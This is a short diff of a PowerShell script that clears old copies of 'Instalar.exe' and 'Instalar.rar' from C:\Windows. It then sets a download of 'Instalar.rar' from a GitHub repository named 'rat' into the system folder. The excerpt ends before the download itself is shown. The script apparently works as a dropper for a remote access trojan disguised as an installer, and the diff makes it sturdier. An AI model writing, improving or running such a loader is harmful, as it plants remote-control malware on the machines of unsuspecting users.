@@ -1,17 +1,19 @@
-
 cd\
 cd c:\windows
 
 $fs = 'c:\windows\Instalar.exe'
-try {	
-   Remove-Item $fs -recurse
-} Catch {}
+if (Test-Path $fs) {
+   try {	
+      Remove-Item $fs -recurse
+   } Catch {}
+}
 
 $fs = 'c:\windows\Instalar.rar'
-try {	
-   Remove-Item $fs -recurse
-} Catch {}
-
+if (Test-Path $fs) {
+   try {	
+      Remove-Item $fs -recurse
+   } Catch {}
+}
 
 $url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.rar"
 $output = "c:\windows\Instalar.rar"
